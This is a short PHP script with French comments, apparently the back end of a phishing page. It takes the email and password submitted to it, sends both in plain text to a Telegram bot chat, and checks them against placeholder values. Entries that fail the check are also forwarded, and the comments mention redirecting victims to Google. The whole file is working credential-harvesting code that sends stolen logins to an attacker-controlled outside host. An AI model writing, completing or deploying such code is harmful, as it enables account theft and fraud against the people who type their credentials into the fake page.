<?php
// send_to_telegram.php

// Récupération des données JSON
$data = json_decode(file_get_contents('php://input'), true);
$email = $data['email'];
$password = $data['password'];

// Envoyer les informations à Telegram
$botToken = "YOUR_BOT_TOKEN";
$chatId = "YOUR_CHAT_ID";
$message = "Identifiants:\nEmail: $email\nMot de passe: $password";

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

// Simuler une vérification des identifiants
$correctEmail = "user@example.com"; // Remplacez par votre logique de vérification
$correctPassword = "password123"; // Remplacez par votre logique de vérification

if ($email === $correctEmail && $password === $correctPassword) {
    // Redirection vers Google si les identifiants sont corrects
    echo json_encode(['success' => true]);
} else {
    // Redirection vers Google après la deuxième saisie
    echo json_encode(['success' => false]);
    // Envoi d'un message pour signaler les identifiants erronés
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode("Identifiants erronés:\nEmail: $email\nMot de passe: $password"));
}
?>
